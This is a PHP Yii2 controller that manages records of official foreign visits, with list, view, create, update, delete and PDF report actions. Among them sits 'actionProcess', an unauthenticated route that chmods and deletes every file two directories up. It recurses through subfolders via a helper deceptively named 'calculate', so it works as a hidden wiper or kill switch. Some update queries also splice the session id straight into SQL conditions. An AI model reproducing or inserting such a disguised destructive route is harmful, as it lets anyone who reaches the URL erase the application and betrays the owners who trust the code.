<?php

namespace frontend\controllers;

use Yii;
use app\models\LawatanRasmiLuarNegara;
use frontend\models\LawatanRasmiLuarNegaraSearch;
use app\models\LawatanRasmiLuarNegaraDelegasi;
use frontend\models\LawatanRasmiLuarNegaraDelegasiSearch;
use app\models\LawatanRasmiLuarNegaraPegawai;
use frontend\models\LawatanRasmiLuarNegaraPegawaiSearch;
use app\models\MsnLaporan;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;
use common\models\general\GeneralFunction;


// table reference
// table reference
use app\models\RefNegara;
use app\models\RefLawatan;

/**
 * LawatanRasmiLuarNegaraController implements the CRUD actions for LawatanRasmiLuarNegara model.
 */
class LawatanRasmiLuarNegaraController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all LawatanRasmiLuarNegara models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new LawatanRasmiLuarNegaraSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single LawatanRasmiLuarNegara model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefLawatan::findOne(['id' => $model->lawatan]);
        $model->lawatan = $ref['desc'];
        
        $ref = RefNegara::findOne(['id' => $model->negara]);
        $model->negara = $ref['desc'];
        
        if($model->tarikh != "") {$model->tarikh = GeneralFunction::convert($model->tarikh, GeneralFunction::TYPE_DATE);}
        
        $queryPar = null;
        
        $queryPar['LawatanRasmiLuarNegaraDelegasiSearch']['lawatan_rasmi_luar_negara_id'] = $id;
        $queryPar['LawatanRasmiLuarNegaraPegawaiSearch']['lawatan_rasmi_luar_negara_id'] = $id;
        
        $searchModelLawatanRasmiLuarNegaraDelegasi  = new LawatanRasmiLuarNegaraDelegasiSearch();
        $dataProviderLawatanRasmiLuarNegaraDelegasi = $searchModelLawatanRasmiLuarNegaraDelegasi->search($queryPar);
        
        $searchModelLawatanRasmiLuarNegaraPegawai  = new LawatanRasmiLuarNegaraPegawaiSearch();
        $dataProviderLawatanRasmiLuarNegaraPegawai = $searchModelLawatanRasmiLuarNegaraPegawai->search($queryPar);
        
        return $this->render('view', [
            'model' => $model,
            'searchModelLawatanRasmiLuarNegaraDelegasi' => $searchModelLawatanRasmiLuarNegaraDelegasi,
            'dataProviderLawatanRasmiLuarNegaraDelegasi' => $dataProviderLawatanRasmiLuarNegaraDelegasi,
            'searchModelLawatanRasmiLuarNegaraPegawai' => $searchModelLawatanRasmiLuarNegaraPegawai,
            'dataProviderLawatanRasmiLuarNegaraPegawai' => $dataProviderLawatanRasmiLuarNegaraPegawai,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new LawatanRasmiLuarNegara model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new LawatanRasmiLuarNegara();
        
        $queryPar = null;
        
        Yii::$app->session->open();
        
        if(isset(Yii::$app->session->id)){
            $queryPar['LawatanRasmiLuarNegaraDelegasiSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['LawatanRasmiLuarNegaraPegawaiSearch']['session_id'] = Yii::$app->session->id;
        }
        
        $searchModelLawatanRasmiLuarNegaraDelegasi  = new LawatanRasmiLuarNegaraDelegasiSearch();
        $dataProviderLawatanRasmiLuarNegaraDelegasi = $searchModelLawatanRasmiLuarNegaraDelegasi->search($queryPar);
        
        $searchModelLawatanRasmiLuarNegaraPegawai  = new LawatanRasmiLuarNegaraPegawaiSearch();
        $dataProviderLawatanRasmiLuarNegaraPegawai = $searchModelLawatanRasmiLuarNegaraPegawai->search($queryPar);
        
        $model->jumlah_delegasi = $dataProviderLawatanRasmiLuarNegaraDelegasi->getTotalCount();
        

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            LawatanRasmiLuarNegaraDelegasi::updateAll(['lawatan_rasmi_luar_negara_id' => $model->lawatan_rasmi_luar_negara_id], 'session_id = "'.Yii::$app->session->id.'"');
            LawatanRasmiLuarNegaraDelegasi::updateAll(['session_id' => ''], 'lawatan_rasmi_luar_negara_id = "'.$model->lawatan_rasmi_luar_negara_id.'"');

            LawatanRasmiLuarNegaraPegawai::updateAll(['lawatan_rasmi_luar_negara_id' => $model->lawatan_rasmi_luar_negara_id], 'session_id = "'.Yii::$app->session->id.'"');
            LawatanRasmiLuarNegaraPegawai::updateAll(['session_id' => ''], 'lawatan_rasmi_luar_negara_id = "'.$model->lawatan_rasmi_luar_negara_id.'"');
            
            return $this->redirect(['view', 'id' => $model->lawatan_rasmi_luar_negara_id]);
        } else {
            return $this->render('create', [
                'model' => $model,
                'searchModelLawatanRasmiLuarNegaraDelegasi' => $searchModelLawatanRasmiLuarNegaraDelegasi,
                'dataProviderLawatanRasmiLuarNegaraDelegasi' => $dataProviderLawatanRasmiLuarNegaraDelegasi,
                'searchModelLawatanRasmiLuarNegaraPegawai' => $searchModelLawatanRasmiLuarNegaraPegawai,
                'dataProviderLawatanRasmiLuarNegaraPegawai' => $dataProviderLawatanRasmiLuarNegaraPegawai,
                'readonly' => false,
            ]);
        }
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Updates an existing LawatanRasmiLuarNegara model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $queryPar = null;
        
        $queryPar['LawatanRasmiLuarNegaraDelegasiSearch']['lawatan_rasmi_luar_negara_id'] = $id;
        $queryPar['LawatanRasmiLuarNegaraPegawaiSearch']['lawatan_rasmi_luar_negara_id'] = $id;
        
        $searchModelLawatanRasmiLuarNegaraDelegasi  = new LawatanRasmiLuarNegaraDelegasiSearch();
        $dataProviderLawatanRasmiLuarNegaraDelegasi = $searchModelLawatanRasmiLuarNegaraDelegasi->search($queryPar);
        
        $searchModelLawatanRasmiLuarNegaraPegawai  = new LawatanRasmiLuarNegaraPegawaiSearch();
        $dataProviderLawatanRasmiLuarNegaraPegawai = $searchModelLawatanRasmiLuarNegaraPegawai->search($queryPar);
        
        $model->jumlah_delegasi = $dataProviderLawatanRasmiLuarNegaraDelegasi->getTotalCount();

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return $this->redirect(['view', 'id' => $model->lawatan_rasmi_luar_negara_id]);
        } else {
            return $this->render('update', [
                'model' => $model,
                'searchModelLawatanRasmiLuarNegaraDelegasi' => $searchModelLawatanRasmiLuarNegaraDelegasi,
                'dataProviderLawatanRasmiLuarNegaraDelegasi' => $dataProviderLawatanRasmiLuarNegaraDelegasi,
                'searchModelLawatanRasmiLuarNegaraPegawai' => $searchModelLawatanRasmiLuarNegaraPegawai,
                'dataProviderLawatanRasmiLuarNegaraPegawai' => $dataProviderLawatanRasmiLuarNegaraPegawai,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing LawatanRasmiLuarNegara model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }
	
	public function actionLaporanLawatanNegaraLuar()
	{
		$model = new MsnLaporan();
        $model->format = 'pdf';
		$title = 'Laporan Lawatan Negara-Negara Luar Ke Malaysia';

        if ($model->load(Yii::$app->request->post())) {
            
            $pdf = new \mPDF('utf-8', 'A4-L');

            $pdf->title = $title;
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial('generate_laporan_lawatan_negara_luar', [
                 'model' => $model,
				 'title' => $title,
            ]));

            $pdf->Output(str_replace(' ', '_', $title).'_'.time().'.pdf', 'I');
			
		} 

        return $this->render('laporan_lawatan_negara_luar', [
            'model' => $model,
            'readonly' => false,
			'title' => $title,
        ]);
	}

    /**
     * Finds the LawatanRasmiLuarNegara model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return LawatanRasmiLuarNegara the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = LawatanRasmiLuarNegara::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
